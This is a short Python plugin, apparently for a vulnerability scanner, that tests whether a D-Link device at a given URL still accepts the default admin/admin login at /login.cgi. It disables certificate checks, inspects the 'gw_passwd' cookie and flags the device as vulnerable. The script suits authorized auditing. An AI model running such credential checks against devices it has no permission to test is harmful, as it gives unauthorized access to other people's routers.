#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'D-Link 默认密码',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded',
      }
  username = "admin"
  passwd = "admin"
  target = '/login.cgi'
  data = f"tm=1647092159.427&user={username}&password={passwd}&selectLanguage=CH&OKBTN=%E7%99%BB%E5%BD%95"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and res.headers.get("Set-Cookie") and re.search("gw_passwd", res.headers.get("Set-Cookie")):
      rep2 =requests.post(url=url1,timeout=3,verify=False,headers=headers)
      if not rep2.headers.get("Set-Cookie"):
        # ret['huixian'] = res.text
        ret['ifbug'] = True
        res.close()
        rep2.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret